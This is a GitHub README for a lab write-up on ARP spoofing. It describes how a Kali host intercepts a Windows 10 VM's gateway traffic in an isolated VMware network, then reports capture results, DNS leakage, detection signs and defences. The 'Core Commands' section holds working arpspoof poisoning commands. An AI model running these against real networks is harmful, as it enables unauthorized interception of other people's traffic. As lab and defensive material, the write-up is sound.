# 🔐 ARP Spoofing & Man-in-the-Middle Lab

Vist: https://nikhith-ni7.github.io/ARP-Spoofing-Man-in-the-Middle-Attack/

<p align="center">
  <img src="https://img.shields.io/badge/Cybersecurity-Lab-0f172a?style=for-the-badge&logo=hackthebox&logoColor=white" />
  <img src="https://img.shields.io/badge/Status-Completed-22c55e?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform-VMware%20NAT-3b82f6?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Tooling-Wireshark%20%7C%20tshark%20%7C%20arpspoof-8b5cf6?style=for-the-badge" />
</p>

<p align="center">
  <b>Silent interception of Windows-to-gateway traffic using ARP poisoning in an isolated virtual lab.</b>
</p>

---

## Overview

This lab demonstrates how ARP spoofing can place a Kali Linux host between a Windows 10 VM and the network gateway in a VMware NAT environment. The objective was to observe the mechanics of a man-in-the-middle attack, capture traffic, and analyze what remains visible even when HTTPS and QUIC are in use [web:2][web:8].

The attack was performed only inside a private lab with machines owned and controlled by the operator. It is intended for educational and defensive learning purposes only.

---

## Lab Environment

| Component | Details |
|---|---|
| Victim | Windows 10 VM |
| Victim IP | `192.168.81.129` |
| Victim MAC | `00:0c:29:e9:39:95` |
| Gateway | VMware NAT Gateway |
| Gateway IP | `192.168.81.2` |
| Gateway MAC | `00:50:56:f0:63:31` |
| Attacker | Kali Linux |
| Attacker IP | `192.168.81.128` |
| Attacker MAC | `00:0c:29:79:7a:8e` |
| Network | `192.168.81.0/24` |

---

## Tools Used

- `arpspoof` from the dsniff suite for ARP poisoning.
- Wireshark for packet capture and packet-level inspection.
- `tshark` for command-line analysis.
- `ip neigh` and `arp` for ARP cache inspection and validation.

---

## Attack Flow

1. Enable IP forwarding on Kali so intercepted traffic continues to flow between victim and gateway.
2. Poison the victim’s ARP cache so it associates the gateway IP with the attacker MAC.
3. Poison the gateway’s ARP cache so it associates the victim IP with the attacker MAC.
4. Verify the ARP table on Windows and confirm the MAC address has changed.
5. Capture and analyze traffic to confirm MITM interception.

---

## Core Commands

### Enable forwarding
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### Poison the victim
```bash
sudo arpspoof -i eth0 -t 192.168.81.129 192.168.81.2
```

### Poison the gateway
```bash
sudo arpspoof -i eth0 -t 192.168.81.2 192.168.81.129
```

### Inspect ARP cache on Windows
```powershell
arp -a
```

---

## Capture Results

During the capture session, the lab recorded:

- `280,525` total frames captured.
- `348.7 MB` of intercepted data.
- `368 seconds` of capture duration.
- `404` ARP spoof packets sent.
- `676` DNS queries observed.

### Protocol Distribution

| Protocol | Frames | Notes |
|---|---:|---|
| QUIC / UDP | 239,260 | Most traffic was encrypted application traffic. |
| TCP | 40,130 | Standard session traffic. |
| TLS / HTTPS | 8,196 | Encrypted content remained unreadable. |
| DNS | 676 | Domain lookups were exposed in plaintext. |
| ARP Spoof | 404 | Attack traffic used to maintain poisoning. |
| ICMP | 27 | Minimal control traffic. |

---

## DNS Visibility

Even though the payloads were encrypted, DNS queries were still observable in the capture. That means visited services and domains could still be inferred from the network metadata [web:2][web:8].

### Top DNS Queries

- `mozilla.cloudflare-dns.com`
- `youtube-ui.l.google.com`
- `www.google.com`
- `www.youtube.com`
- `youtubei.googleapis.com`
- `youtube.googleapis.com`
- `mozilla.org`

---

## Forensic Indicators

Wireshark exposed the attack through duplicate IP-to-MAC mappings and repeated unsolicited ARP replies. That kind of duplicate mapping is a strong forensic sign of ARP spoofing [web:2][web:8].

Example indicator:

```text
192.168.81.2 is at 00:0c:29:79:7a:8e
192.168.81.129 is at 00:0c:29:79:7a:8e
duplicate use of 192.168.81.2 detected
```

---

## Findings

- ARP spoofing worked successfully and established a silent MITM position.
- HTTPS and QUIC protected payload contents, so readable content was not exposed.
- DNS traffic still leaked visited domains in plaintext.
- Wireshark duplicate-address warnings provided a clear detection signal.
- Manual `arpspoof` control was more reliable than automated tools in this VMware NAT setup.

---

## Defensive Controls

| Defense | Benefit |
|---|---|
| Dynamic ARP Inspection | Validates ARP replies against trusted DHCP bindings. |
| Static ARP entries | Prevents critical hosts from being silently remapped. |
| DNS over HTTPS / DNS over TLS | Hides DNS lookups from local network observers. |
| VPN / TLS everywhere | Keeps intercepted traffic encrypted and unreadable. |
| IDS / monitoring | Detects MAC changes, duplicate ARP activity, and anomalies. |

---

## Cleanup

### Kali
```bash
sudo pkill arpspoof
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo ip neigh flush all
```

### Windows
```powershell
arp -d *
```

---

## Repository Contents

- `README.md` — project overview and lab summary.
- `arpspooff.pcapng` — Wireshark capture from the session.
- `ARP_Lab_Report.docx` — full lab report and analysis.

---

## Disclaimer

This project was completed in an isolated virtual lab using systems owned and controlled by the operator. It is provided for cybersecurity education, analysis, and defensive awareness only. Never perform ARP spoofing or MITM activity on networks without explicit authorization.

---

<p align="center">
  <i>Built for hands-on network security learning, packet analysis, and defensive awareness.</i>
</p>
